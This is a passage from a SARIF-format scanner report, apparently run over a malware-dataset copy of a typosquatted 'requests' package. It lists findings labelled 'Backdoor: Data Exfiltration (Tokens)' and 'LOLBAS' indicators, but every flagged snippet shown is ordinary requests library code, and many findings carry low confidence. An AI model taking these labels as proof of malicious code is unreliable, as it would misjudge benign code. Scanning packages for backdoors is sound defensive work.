                    "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                    "rendered": {
                      "text": "            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n",
                      "markdown": "`            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(username, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 36,
                  "endLine": 53,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n",
                    "rendered": {
                      "text": "            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n",
                      "markdown": "`            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n            category=DeprecationWarning,\n        )\n        password = str(password)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 24,
                  "endLine": 50,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n",
                    "rendered": {
                      "text": "\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n",
                      "markdown": "`\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n            \"a string or bytes object in the near future to avoid \"\n            \"problems.\".format(type(password)),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 22,
                  "endLine": 48,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n",
                    "rendered": {
                      "text": "        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n",
                      "markdown": "`        )\n        username = str(username)\n\n    if not isinstance(password, basestring):\n        warnings.warn(\n            \"Non-string passwords will no longer be supported in Requests \"\n            \"3.0.0. Please convert the object you've passed in ({!r}) to \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 30,
                  "endLine": 28,
                  "endColumn": 38,
                  "snippet": {
                    "text": "CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n",
                    "rendered": {
                      "text": "CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n",
                      "markdown": "`CONTENT_TYPE_MULTI_PART = 'multipart/form-data'\n\n\ndef _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 52,
                  "endLine": 143,
                  "endColumn": 56,
                  "snippet": {
                    "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                    "rendered": {
                      "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                      "markdown": "`            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 59,
                  "endLine": 143,
                  "endColumn": 64,
                  "snippet": {
                    "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                    "rendered": {
                      "text": "            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n",
                      "markdown": "`            _algorithm = 'MD5'\n        else:\n            _algorithm = algorithm.upper()\n        # lambdas assume digest modules are imported at the top level\n        if _algorithm == 'MD5' or _algorithm == 'MD5-SESS':\n            def md5_utf8(x):\n                if isinstance(x, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 44,
                  "endLine": 31,
                  "endColumn": 49,
                  "snippet": {
                    "text": "def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n",
                    "rendered": {
                      "text": "def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n",
                      "markdown": "`def _basic_auth_str(username, password):\n    \"\"\"Returns a Basic Auth string.\"\"\"\n\n    # \"I want us to put a big-ol' comment on top of it that\n    # says that this behaviour is dumb but we need to preserve\n    # it because people are relying on it.\"\n    #    - Lukasa\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 4,
                  "endLine": 17,
                  "endColumn": 12,
                  "snippet": {
                    "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                    "rendered": {
                      "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                      "markdown": "`import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/auth.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 6,
                  "endLine": 13,
                  "snippet": {
                    "text": "\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n",
                    "rendered": {
                      "text": "\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n",
                      "markdown": "`\nimport os\nimport re\nimport time\nimport hashlib\nimport threading\nimport warnings\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/api.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 22,
                  "endLine": 61,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n",
                    "rendered": {
                      "text": "    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n",
                      "markdown": "`    # avoid leaving sockets open which can trigger a ResourceWarning in some\n    # cases, and look like a memory leak in others.\n    with sessions.Session() as session:\n        return session.request(method=method, url=url, **kwargs)\n\n\ndef get(url, params=None, **kwargs):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/api.py"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 24,
                  "endLine": 52,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n",
                      "markdown": "`    Usage::\n\n      >>> import requests\n      >>> req = requests.request('GET', 'https://httpbin.org/get')\n      >>> req\n      <Response [200]>\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/api.py"
                },
                "region": {
                  "startLine": 91,
                  "startColumn": 15,
                  "endLine": 91,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n",
                    "rendered": {
                      "text": "\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n",
                      "markdown": "`\n\ndef head(url, **kwargs):\n    r\"\"\"Sends a HEAD request.\n\n    :param url: URL for the new :class:`Request` object.\n    :param \\*\\*kwargs: Optional arguments that ``request`` takes. If\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}